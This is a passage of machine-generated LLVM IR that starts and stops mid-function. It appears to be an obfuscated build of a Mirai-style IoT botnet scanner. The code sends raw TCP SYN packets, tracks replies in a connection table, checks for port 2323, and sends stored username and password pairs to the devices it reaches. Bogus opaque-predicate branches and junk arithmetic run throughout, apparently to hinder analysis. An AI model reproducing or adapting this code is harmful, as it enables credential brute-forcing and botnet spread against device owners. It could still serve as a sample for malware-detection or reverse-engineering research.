  %1549 = urem i32 %1548, 2
  %1550 = icmp eq i32 %1549, 0
  %1551 = icmp slt i32 %1546, 10
  %1552 = or i1 %1550, %1551
  br i1 %1552, label %originalBB246, label %originalBB246alteredBB

originalBB246:                                    ; preds = %originalBB246alteredBB, %1544
  %1553 = load i32, i32* @x.53
  %1554 = load i32, i32* @y.54
  %1555 = sub i32 %1553, 1
  %1556 = mul i32 %1553, %1555
  %1557 = urem i32 %1556, 2
  %1558 = icmp eq i32 %1557, 0
  %1559 = icmp slt i32 %1554, 10
  %1560 = or i1 %1558, %1559
  br i1 %1560, label %originalBBpart2248, label %originalBB246alteredBB

originalBBpart2248:                               ; preds = %originalBB246
  br label %1561

; <label>:1561:                                   ; preds = %originalBBpart2248, %1522
  %1562 = load i32, i32* @x.53
  %1563 = load i32, i32* @y.54
  %1564 = sub i32 %1562, 1
  %1565 = mul i32 %1562, %1564
  %1566 = urem i32 %1565, 2
  %1567 = icmp eq i32 %1566, 0
  %1568 = icmp slt i32 %1563, 10
  %1569 = or i1 %1567, %1568
  br i1 %1569, label %originalBB250, label %originalBB250alteredBB

originalBB250:                                    ; preds = %originalBB250alteredBB, %1561
  %1570 = load i32, i32* @x.53
  %1571 = load i32, i32* @y.54
  %1572 = sub i32 %1570, 1
  %1573 = mul i32 %1570, %1572
  %1574 = urem i32 %1573, 2
  %1575 = icmp eq i32 %1574, 0
  %1576 = icmp slt i32 %1571, 10
  %1577 = or i1 %1575, %1576
  br i1 %1577, label %originalBBpart2252, label %originalBB250alteredBB

originalBBpart2252:                               ; preds = %originalBB250
  br label %1579

; <label>:1578:                                   ; preds = %1203
  store i32 0, i32* %33, align 4
  br label %1579

; <label>:1579:                                   ; preds = %1578, %originalBBpart2252, %originalBBpart2240, %1428, %1392, %1372, %originalBBpart2228, %1316, %1273, %originalBBpart2216
  %1580 = load i32, i32* %33, align 4
  %1581 = icmp eq i32 %1580, 0
  br i1 %1581, label %1582, label %1583

; <label>:1582:                                   ; preds = %1579
  br label %1629

; <label>:1583:                                   ; preds = %1579
  %1584 = load i32, i32* %33, align 4
  %1585 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1586 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1585, i32 0, i32 6
  %1587 = load i32, i32* %1586, align 4
  %1588 = icmp sgt i32 %1584, %1587
  br i1 %1588, label %1589, label %1593

; <label>:1589:                                   ; preds = %1583
  %1590 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1591 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1590, i32 0, i32 6
  %1592 = load i32, i32* %1591, align 4
  store i32 %1592, i32* %33, align 4
  br label %1593

; <label>:1593:                                   ; preds = %1589, %1583
  %1594 = load i32, i32* %33, align 4
  %1595 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1596 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1595, i32 0, i32 6
  %1597 = load i32, i32* %1596, align 4
  %1598 = sub nsw i32 %1597, %1594
  store i32 %1598, i32* %1596, align 4
  %1599 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1600 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1599, i32 0, i32 7
  %1601 = getelementptr inbounds [256 x i8], [256 x i8]* %1600, i32 0, i32 0
  %1602 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1603 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1602, i32 0, i32 7
  %1604 = getelementptr inbounds [256 x i8], [256 x i8]* %1603, i32 0, i32 0
  %1605 = load i32, i32* %33, align 4
  %1606 = sext i32 %1605 to i64
  %1607 = getelementptr inbounds i8, i8* %1604, i64 %1606
  %1608 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1609 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1608, i32 0, i32 6
  %1610 = load i32, i32* %1609, align 4
  %1611 = sext i32 %1610 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1601, i8* %1607, i64 %1611, i32 1, i1 false)
  br label %1612

; <label>:1612:                                   ; preds = %1593
  %1613 = load i32, i32* @x.53
  %1614 = load i32, i32* @y.54
  %1615 = sub i32 %1613, 1
  %1616 = mul i32 %1613, %1615
  %1617 = urem i32 %1616, 2
  %1618 = icmp eq i32 %1617, 0
  %1619 = icmp slt i32 %1614, 10
  %1620 = or i1 %1618, %1619
  br i1 %1620, label %originalBB254, label %originalBB254alteredBB

originalBB254:                                    ; preds = %originalBB254alteredBB, %1612
  %1621 = load i32, i32* @x.53
  %1622 = load i32, i32* @y.54
  %1623 = sub i32 %1621, 1
  %1624 = mul i32 %1621, %1623
  %1625 = urem i32 %1624, 2
  %1626 = icmp eq i32 %1625, 0
  %1627 = icmp slt i32 %1622, 10
  %1628 = or i1 %1626, %1627
  br i1 %1628, label %originalBBpart2256, label %originalBB254alteredBB

originalBBpart2256:                               ; preds = %originalBB254
  br label %1203

; <label>:1629:                                   ; preds = %1582
  br label %1036

; <label>:1630:                                   ; preds = %1193, %1041
  br label %1631

; <label>:1631:                                   ; preds = %1630, %1002
  br label %1632

; <label>:1632:                                   ; preds = %1631, %originalBBpart2176, %921
  %1633 = load i32, i32* @x.53
  %1634 = load i32, i32* @y.54
  %1635 = sub i32 %1633, 1
  %1636 = mul i32 %1633, %1635
  %1637 = urem i32 %1636, 2
  %1638 = icmp eq i32 %1637, 0
  %1639 = icmp slt i32 %1634, 10
  %1640 = or i1 %1638, %1639
  br i1 %1640, label %originalBB258, label %originalBB258alteredBB

originalBB258:                                    ; preds = %originalBB258alteredBB, %1632
  %1641 = load i32, i32* %1, align 4
  %1642 = add nsw i32 %1641, 1
  store i32 %1642, i32* %1, align 4
  %1643 = load i32, i32* @x.53
  %1644 = load i32, i32* @y.54
  %1645 = sub i32 %1643, 1
  %1646 = mul i32 %1643, %1645
  %1647 = urem i32 %1646, 2
  %1648 = icmp eq i32 %1647, 0
  %1649 = icmp slt i32 %1644, 10
  %1650 = or i1 %1648, %1649
  br i1 %1650, label %originalBBpart2263, label %originalBB258alteredBB

originalBBpart2263:                               ; preds = %originalBB258
  br label %909

; <label>:1651:                                   ; preds = %909
  %1652 = load i32, i32* @x.53
  %1653 = load i32, i32* @y.54
  %1654 = sub i32 %1652, 1
  %1655 = mul i32 %1652, %1654
  %1656 = urem i32 %1655, 2
  %1657 = icmp eq i32 %1656, 0
  %1658 = icmp slt i32 %1653, 10
  %1659 = or i1 %1657, %1658
  br i1 %1659, label %originalBB265, label %originalBB265alteredBB

originalBB265:                                    ; preds = %originalBB265alteredBB, %1651
  %1660 = load i32, i32* @x.53
  %1661 = load i32, i32* @y.54
  %1662 = sub i32 %1660, 1
  %1663 = mul i32 %1660, %1662
  %1664 = urem i32 %1663, 2
  %1665 = icmp eq i32 %1664, 0
  %1666 = icmp slt i32 %1661, 10
  %1667 = or i1 %1665, %1666
  br i1 %1667, label %originalBBpart2267, label %originalBB265alteredBB

originalBBpart2267:                               ; preds = %originalBB265
  br label %181

originalBBalteredBB:                              ; preds = %originalBB, %80
  %1668 = load i32, i32* @rsck, align 4
  %1669 = load i32, i32* @rsck, align 4
  %1670 = call i32 (i32, i32, ...) @fcntl(i32 %1669, i32 3, i32 0)
  %_ = sub i32 2048, %1670
  %gen = mul i32 %_, %1670
  %_1 = sub i32 0, 2048
  %gen2 = add i32 %_1, %1670
  %_3 = sub i32 2048, %1670
  %gen4 = mul i32 %_3, %1670
  %_5 = shl i32 2048, %1670
  %1671 = or i32 2048, %1670
  %1672 = call i32 (i32, i32, ...) @fcntl(i32 %1668, i32 4, i32 %1671)
  store i32 1, i32* %1, align 4
  %1673 = load i32, i32* @rsck, align 4
  %1674 = bitcast i32* %1 to i8*
  %1675 = call i32 @setsockopt(i32 %1673, i32 0, i32 3, i8* %1674, i32 4) #6
  %1676 = icmp ne i32 %1675, 0
  br label %originalBB

originalBB6alteredBB:                             ; preds = %originalBB6, %109
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %223
  %1677 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %1678 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1677, i32 0, i32 9
  %1679 = load i32, i32* %1678, align 4
  %1680 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %1681 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1680, i32 0, i32 2
  store i32 %1679, i32* %1681, align 4
  %1682 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %1683 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1682, i32 0, i32 6
  store i16 0, i16* %1683, align 4
  %1684 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %1685 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %1686 = bitcast %struct.tcphdr* %1685 to i8*
  %1687 = call zeroext i16 @htons(i16 zeroext 20) #7
  %1688 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %1684, i8* %1686, i16 zeroext %1687, i32 20)
  %1689 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %1690 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1689, i32 0, i32 6
  store i16 %1688, i16* %1690, align 4
  %1691 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %1691, align 4
  %1692 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %1693 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1692, i32 0, i32 9
  %1694 = load i32, i32* %1693, align 4
  %1695 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %1696 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1695, i32 0, i32 0
  store i32 %1694, i32* %1696, align 4
  %1697 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %1698 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1697, i32 0, i32 1
  %1699 = load i16, i16* %1698, align 2
  %1700 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %1699, i16* %1700, align 2
  %1701 = load i32, i32* @rsck, align 4
  %1702 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %1703 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %1703, %struct.sockaddr** %1702, align 8
  %1704 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %1705 = load %struct.sockaddr*, %struct.sockaddr** %1704, align 8
  %1706 = call i64 @sendto(i32 %1701, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %1705, i32 16)
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %273
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %290
  store i32 0, i32* %9, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %323
  %1707 = call i32* @__errno_location() #7
  %1708 = load i32, i32* %1707, align 4
  %1709 = icmp eq i32 %1708, 11
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %347
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %369
  %1710 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %1711 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1710, i32 0, i32 9
  %1712 = load i32, i32* %1711, align 4
  %1713 = load i32, i32* @LOCAL_ADDR, align 4
  %1714 = icmp ne i32 %1712, %1713
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %407
  %1715 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %1716 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1715, i32 0, i32 0
  %1717 = load i16, i16* %1716, align 4
  %1718 = zext i16 %1717 to i32
  %1719 = call zeroext i16 @htons(i16 zeroext 2323) #7
  %1720 = zext i16 %1719 to i32
  %1721 = icmp ne i32 %1718, %1720
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %432
  %1722 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %1723 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1722, i32 0, i32 1
  %1724 = load i16, i16* %1723, align 2
  %1725 = zext i16 %1724 to i32
  %1726 = load i16, i16* %2, align 2
  %1727 = zext i16 %1726 to i32
  %1728 = icmp ne i32 %1725, %1727
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %473
  %1729 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %1730 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1729, i32 0, i32 4
  %1731 = load i16, i16* %1730, align 4
  %_43 = shl i16 %1731, 10
  %1732 = lshr i16 %1731, 10
  %_44 = sub i16 %1732, 1
  %gen45 = mul i16 %_44, 1
  %_46 = sub i16 0, %1732
  %gen47 = add i16 %_46, 1
  %_48 = shl i16 %1732, 1
  %_49 = sub i16 %1732, 1
  %gen50 = mul i16 %_49, 1
  %_51 = sub i16 0, %1732
  %gen52 = add i16 %_51, 1
  %_53 = sub i16 0, %1732
  %gen54 = add i16 %_53, 1
  %_55 = sub i16 0, %1732
  %gen56 = add i16 %_55, 1
  %_57 = shl i16 %1732, 1
  %1733 = and i16 %1732, 1
  %1734 = icmp ne i16 %1733, 0
  br label %originalBB42

originalBB61alteredBB:                            ; preds = %originalBB61, %496
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %513
  %1735 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %1736 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1735, i32 0, i32 4
  %1737 = load i16, i16* %1736, align 4
  %_66 = sub i16 0, %1737
  %gen67 = add i16 %_66, 8
  %_68 = sub i16 %1737, 8
  %gen69 = mul i16 %_68, 8
  %_70 = sub i16 0, %1737
  %gen71 = add i16 %_70, 8
  %_72 = sub i16 0, %1737
  %gen73 = add i16 %_72, 8
  %_74 = sub i16 %1737, 8
  %gen75 = mul i16 %_74, 8
  %1738 = lshr i16 %1737, 8
  %_76 = shl i16 %1738, 1
  %_77 = sub i16 %1738, 1
  %gen78 = mul i16 %_77, 1
  %_79 = sub i16 %1738, 1
  %gen80 = mul i16 %_79, 1
  %_81 = shl i16 %1738, 1
  %_82 = sub i16 0, %1738
  %gen83 = add i16 %_82, 1
  %_84 = shl i16 %1738, 1
  %_85 = sub i16 %1738, 1
  %gen86 = mul i16 %_85, 1
  %_87 = shl i16 %1738, 1
  %_88 = shl i16 %1738, 1
  %1739 = and i16 %1738, 1
  %1740 = icmp ne i16 %1739, 0
  br label %originalBB65

originalBB92alteredBB:                            ; preds = %originalBB92, %537
  %1741 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %1742 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1741, i32 0, i32 3
  %1743 = load i32, i32* %1742, align 4
  %1744 = call i32 @ntohl(i32 %1743) #7
  %_93 = sub i32 0, %1744
  %gen94 = add i32 %_93, 1
  %_95 = shl i32 %1744, 1
  %_96 = shl i32 %1744, 1
  %_97 = shl i32 %1744, 1
  %_98 = sub i32 %1744, 1
  %gen99 = mul i32 %_98, 1
  %_100 = sub i32 %1744, 1
  %gen101 = mul i32 %_100, 1
  %_102 = shl i32 %1744, 1
  %_103 = shl i32 %1744, 1
  %_104 = sub i32 0, %1744
  %gen105 = add i32 %_104, 1
  %1745 = sub i32 %1744, 1
  %1746 = call i32 @htonl(i32 %1745) #7
  %1747 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %1748 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1747, i32 0, i32 8
  %1749 = load i32, i32* %1748, align 4
  %1750 = icmp ne i32 %1746, %1749
  br label %originalBB92

originalBB109alteredBB:                           ; preds = %originalBB109, %570
  %1751 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %1752 = load i32, i32* %18, align 4
  %1753 = sext i32 %1752 to i64
  %1754 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1751, i64 %1753
  %1755 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1754, i32 0, i32 3
  %1756 = load i32, i32* %1755, align 8
  %1757 = icmp eq i32 %1756, 0
  br label %originalBB109

originalBB113alteredBB:                           ; preds = %originalBB113, %601
  %1758 = load i32, i32* %18, align 4
  %_114 = shl i32 %1758, 1
  %_115 = sub i32 0, %1758
  %gen116 = add i32 %_115, 1
  %_117 = sub i32 0, %1758
  %gen118 = add i32 %_117, 1
  %_119 = sub i32 0, %1758
  %gen120 = add i32 %_119, 1
  %1759 = add nsw i32 %1758, 1
  store i32 %1759, i32* %18, align 4
  br label %originalBB113

originalBB124alteredBB:                           ; preds = %originalBB124, %674
  %1760 = load i32, i32* @fake_time, align 4
  %1761 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1762 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1761, i32 0, i32 2
  %1763 = load i32, i32* %1762, align 4
  %_125 = sub i32 %1760, %1763
  %gen126 = mul i32 %_125, %1763
  %_127 = sub i32 %1760, %1763
  %gen128 = mul i32 %_127, %1763
  %_129 = sub i32 %1760, %1763
  %gen130 = mul i32 %_129, %1763
  %_131 = shl i32 %1760, %1763
  %1764 = sub i32 %1760, %1763
  %1765 = load i32, i32* %28, align 4
  %1766 = icmp ugt i32 %1764, %1765
  br label %originalBB124

originalBB135alteredBB:                           ; preds = %originalBB135, %709
  %1767 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1768 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1767, i32 0, i32 8
  %1769 = load i8, i8* %1768, align 8
  %_136 = sub i8 %1769, 1
  %gen137 = mul i8 %_136, 1
  %_138 = shl i8 %1769, 1
  %_139 = sub i8 0, %1769
  %gen140 = add i8 %_139, 1
  %_141 = shl i8 %1769, 1
  %_142 = sub i8 %1769, 1
  %gen143 = mul i8 %_142, 1
  %_144 = sub i8 %1769, 1
  %gen145 = mul i8 %_144, 1
  %_146 = shl i8 %1769, 1
  %1770 = add i8 %1769, 1
  store i8 %1770, i8* %1768, align 8
  %1771 = zext i8 %1770 to i32
  %1772 = icmp eq i32 %1771, 10
  br label %originalBB135

originalBB150alteredBB:                           ; preds = %originalBB150, %746
  %1773 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1774 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1773, i32 0, i32 3
  %1775 = load i32, i32* %1774, align 8
  %1776 = icmp eq i32 %1775, 1
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %788
  %1777 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1778 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1777, i32 0, i32 1
  %1779 = load i32, i32* %1778, align 8
  store i32 %1779, i32* %12, align 4
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %835
  %1780 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1781 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1780, i32 0, i32 1
  %1782 = load i32, i32* %1781, align 8
  store i32 %1782, i32* %11, align 4
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %855
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %873
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %939
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %1783 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1784 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1783, i32 0, i32 1
  %1785 = load i32, i32* %1784, align 8
  %1786 = bitcast i32* %29 to i8*
  %1787 = call i32 @getsockopt(i32 %1785, i32 1, i32 4, i8* %1786, i32* %31) #6
  store i32 %1787, i32* %30, align 4
  %1788 = load i32, i32* %29, align 4
  %1789 = icmp eq i32 %1788, 0
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %974
  %1790 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1791 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1790, i32 0, i32 1
  %1792 = load i32, i32* %1791, align 8
  %1793 = call i32 @close(i32 %1792)
  %1794 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1795 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1794, i32 0, i32 1
  store i32 -1, i32* %1795, align 8
  %1796 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1797 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1796, i32 0, i32 8
  store i8 0, i8* %1797, align 8
  %1798 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1799 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1798, i32 0, i32 3
  store i32 0, i32* %1799, align 8
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1019
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1047
  %1800 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1801 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1800, i32 0, i32 7
  %1802 = getelementptr inbounds [256 x i8], [256 x i8]* %1801, i32 0, i32 0
  %1803 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1804 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1803, i32 0, i32 7
  %1805 = getelementptr inbounds [256 x i8], [256 x i8]* %1804, i32 0, i32 0
  %1806 = getelementptr inbounds i8, i8* %1805, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1802, i8* %1806, i64 192, i32 1, i1 false)
  %1807 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1808 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1807, i32 0, i32 6
  %1809 = load i32, i32* %1808, align 4
  %_183 = sub i32 %1809, 64
  %gen184 = mul i32 %_183, 64
  %_185 = shl i32 %1809, 64
  %_186 = sub i32 %1809, 64
  %gen187 = mul i32 %_186, 64
  %_188 = shl i32 %1809, 64
  %1810 = sub nsw i32 %1809, 64
  store i32 %1810, i32* %1808, align 4
  br label %originalBB182

originalBB192alteredBB:                           ; preds = %originalBB192, %1097
  %1811 = load i32, i32* %32, align 4
  %1812 = icmp eq i32 %1811, -1
  br label %originalBB192

originalBB196alteredBB:                           ; preds = %originalBB196, %1116
  %1813 = call i32* @__errno_location() #7
  %1814 = load i32, i32* %1813, align 4
  %1815 = icmp ne i32 %1814, 11
  br label %originalBB196

originalBB200alteredBB:                           ; preds = %originalBB200, %1136
  %1816 = call i32* @__errno_location() #7
  %1817 = load i32, i32* %1816, align 4
  %1818 = icmp ne i32 %1817, 11
  br label %originalBB200

originalBB204alteredBB:                           ; preds = %originalBB204, %1156
  %1819 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1820 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1819, i32 0, i32 1
  %1821 = load i32, i32* %1820, align 8
  %1822 = call i32 @close(i32 %1821)
  %1823 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1824 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1823, i32 0, i32 1
  store i32 -1, i32* %1824, align 8
  %1825 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1826 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1825, i32 0, i32 8
  %1827 = load i8, i8* %1826, align 8
  %_205 = sub i8 %1827, 1
  %gen206 = mul i8 %_205, 1
  %_207 = sub i8 %1827, 1
  %gen208 = mul i8 %_207, 1
  %_209 = sub i8 %1827, 1
  %gen210 = mul i8 %_209, 1
  %1828 = add i8 %1827, 1
  store i8 %1828, i8* %1826, align 8
  %1829 = zext i8 %1828 to i32
  %1830 = icmp sge i32 %1829, 10
  br label %originalBB204

originalBB214alteredBB:                           ; preds = %originalBB214, %1214
  br label %originalBB214

originalBB218alteredBB:                           ; preds = %originalBB218, %1235
  %1831 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1832 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1831, i32 0, i32 1
  %1833 = load i32, i32* %1832, align 8
  %1834 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1835 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1834, i32 0, i32 0
  %1836 = load %struct.scanner_auth*, %struct.scanner_auth** %1835, align 8
  %1837 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1836, i32 0, i32 0
  %1838 = load i8*, i8** %1837, align 8
  %1839 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1840 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1839, i32 0, i32 0
  %1841 = load %struct.scanner_auth*, %struct.scanner_auth** %1840, align 8
  %1842 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1841, i32 0, i32 4
  %1843 = load i8, i8* %1842, align 4
  %1844 = zext i8 %1843 to i64
  %1845 = call i64 @send(i32 %1833, i8* %1838, i64 %1844, i32 16384)
  %1846 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1847 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1846, i32 0, i32 1
  %1848 = load i32, i32* %1847, align 8
  %1849 = call i64 @send(i32 %1848, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  %1850 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1851 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1850, i32 0, i32 3
  store i32 4, i32* %1851, align 8
  br label %originalBB218

originalBB222alteredBB:                           ; preds = %originalBB222, %1278
  %1852 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1853 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1852, i32 0, i32 1
  %1854 = load i32, i32* %1853, align 8
  %1855 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1856 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1855, i32 0, i32 0
  %1857 = load %struct.scanner_auth*, %struct.scanner_auth** %1856, align 8
  %1858 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1857, i32 0, i32 1
  %1859 = load i8*, i8** %1858, align 8
  %1860 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1861 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1860, i32 0, i32 0
  %1862 = load %struct.scanner_auth*, %struct.scanner_auth** %1861, align 8
  %1863 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1862, i32 0, i32 5
  %1864 = load i8, i8* %1863, align 1
  %1865 = zext i8 %1864 to i64
  %1866 = call i64 @send(i32 %1854, i8* %1859, i64 %1865, i32 16384)
  %1867 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1868 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1867, i32 0, i32 1
  %1869 = load i32, i32* %1868, align 8
  %1870 = call i64 @send(i32 %1869, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  %1871 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1872 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1871, i32 0, i32 3
  store i32 5, i32* %1872, align 8
  br label %originalBB222

originalBB226alteredBB:                           ; preds = %originalBB226, %1336
  br label %originalBB226

originalBB230alteredBB:                           ; preds = %originalBB230, %1397
  call void @table_unlock_val(i8 zeroext 7)
  %1873 = call i8* @table_retrieve_val(i32 7, i32* %41)
  store i8* %1873, i8** %40, align 8
  %1874 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1875 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1874, i32 0, i32 1
  %1876 = load i32, i32* %1875, align 8
  %1877 = load i8*, i8** %40, align 8
  %1878 = load i32, i32* %41, align 4
  %1879 = sext i32 %1878 to i64
  %1880 = call i64 @send(i32 %1876, i8* %1877, i64 %1879, i32 16384)
  %1881 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1882 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1881, i32 0, i32 1
  %1883 = load i32, i32* %1882, align 8
  %1884 = call i64 @send(i32 %1883, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 7)
  %1885 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1886 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1885, i32 0, i32 3
  store i32 9, i32* %1886, align 8
  br label %originalBB230

originalBB234alteredBB:                           ; preds = %originalBB234, %1433
  call void @table_unlock_val(i8 zeroext 8)
  %1887 = call i8* @table_retrieve_val(i32 8, i32* %43)
  store i8* %1887, i8** %42, align 8
  %1888 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1889 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1888, i32 0, i32 1
  %1890 = load i32, i32* %1889, align 8
